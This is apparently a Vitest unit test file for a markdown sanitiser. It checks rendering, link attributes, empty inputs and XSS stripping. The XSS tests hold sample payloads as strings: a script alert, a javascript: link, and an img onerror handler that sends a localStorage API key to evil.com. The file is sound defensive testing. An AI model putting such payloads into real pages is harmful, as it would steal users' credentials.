import { describe, it, expect } from 'vitest';
import { renderSafeMarkdown } from '../utils/markdownUtils';

describe('renderSafeMarkdown - XSS Protection and Markdown Utility', () => {
  it('renders standard markdown (bold, lists, code) into HTML', () => {
    const input = '# Heading\n\n**Bold Text** and *italic*\n\n- Item 1\n- Item 2';
    const output = renderSafeMarkdown(input);

    expect(output).toContain('<h1');
    expect(output).toContain('<strong>Bold Text</strong>');
    expect(output).toContain('<li>Item 1</li>');
  });

  it('strips dangerous <script> tags and malicious payloads', () => {
    const malicious = `## Hello\n\n<script>alert("XSS")</script>\n\nSafe text`;
    const output = renderSafeMarkdown(malicious);

    expect(output).not.toContain('<script>');
    expect(output).not.toContain('alert("XSS")');
    expect(output).toContain('Safe text');
  });

  it('strips inline event handlers such as onerror or onload and javascript URLs', () => {
    const maliciousImg = `<img src="invalid.jpg" onerror="fetch('https://evil.com?leak=' + localStorage.getItem('LITSIFT_GEMINI_API_KEY'))" />`;
    const output = renderSafeMarkdown(maliciousImg);

    expect(output).not.toContain('onerror');
    expect(output).not.toContain('evil.com');

    const maliciousLink = `<a href="javascript:alert('pwned')">Click here</a>`;
    const linkOutput = renderSafeMarkdown(maliciousLink);
    expect(linkOutput).not.toContain('javascript:');
  });

  it('adds target="_blank" and rel="noopener noreferrer" to external links', () => {
    const linkMarkdown = '[Google AI Studio](https://aistudio.google.com/)';
    const output = renderSafeMarkdown(linkMarkdown);

    expect(output).toContain('target="_blank"');
    expect(output).toContain('rel="noopener noreferrer"');
    expect(output).toContain('href="https://aistudio.google.com/"');
  });

  it('handles empty, null, or undefined inputs gracefully without throwing', () => {
    expect(renderSafeMarkdown('')).toBe('');
    expect(renderSafeMarkdown(null)).toBe('');
    expect(renderSafeMarkdown(undefined)).toBe('');
  });
});
